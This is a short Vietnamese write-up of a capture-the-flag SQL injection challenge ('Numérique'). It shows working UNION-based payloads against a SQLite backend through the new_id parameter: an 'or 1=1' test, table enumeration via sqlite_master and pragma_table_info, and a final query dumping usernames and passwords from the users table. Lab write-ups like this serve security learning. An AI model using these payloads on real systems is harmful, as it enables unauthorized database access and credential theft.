# Challenge: SQL injection - Numérique

<img width="1496" height="498" alt="image" src="https://github.com/user-attachments/assets/a5f1776d-a71e-4c06-ade1-f62013d8a1a7" />


Vào Challenge thì cho một giao diện như vầy

<img width="1900" height="232" alt="image" src="https://github.com/user-attachments/assets/f6ff0e3d-51be-458d-80d4-28de56315361" />

Mình thử vào một link ở trong trang web này thì nhận thấy ở trên đường dẫn , tham số new_id đang nhận giá trị từ bên ngoài để thực hiện truy vấn SQL và trả kết quả của câu truy vấn ra màn hình

<img width="887" height="323" alt="image" src="https://github.com/user-attachments/assets/0e5019d6-326e-4d11-8b8d-1f0059bcb655" />

Mình thử nhập vào payload
```sql
or 1=1 -- -
```
Thì câu truy vấn nó vấn hoạt động ko báo lỗi gì cả và trả về kết quả cho mình

<img width="1067" height="452" alt="image" src="https://github.com/user-attachments/assets/abd17fec-6010-4900-9ad2-d37805a122c6" />

Tiếp tục xác định số cột , và xác định được câu truy vấn trước sử dụng 3 cột 

<img width="941" height="335" alt="image" src="https://github.com/user-attachments/assets/41ee4c73-d946-4ec8-9a5f-bd4891773b92" />

Tiếp theo mình cần xác định tên bảng 
```sql
1000  union SELECT 1,name,3 FROM sqlite_master--
```
<img width="1454" height="380" alt="image" src="https://github.com/user-attachments/assets/fb87d423-9011-4a3e-ac34-72abbdc862cf" />

Có 2 bảng users và news , Tiếp tục cần biết tên cột trong bảng users
```sql
1000 union SELECT name,name,name FROM pragma_table_info('users')---
```

Và xác định username,password tương tự với bài String. Cuối cùng là lấy mật khẩu 
```sql
1000 union select 1,username,password from users---
```

<img width="1875" height="525" alt="password numberic" src="https://github.com/user-attachments/assets/6a1b1d83-c7e3-4a0a-bcff-da25827609c1" />

Lấy password và Done Challenge này!!!
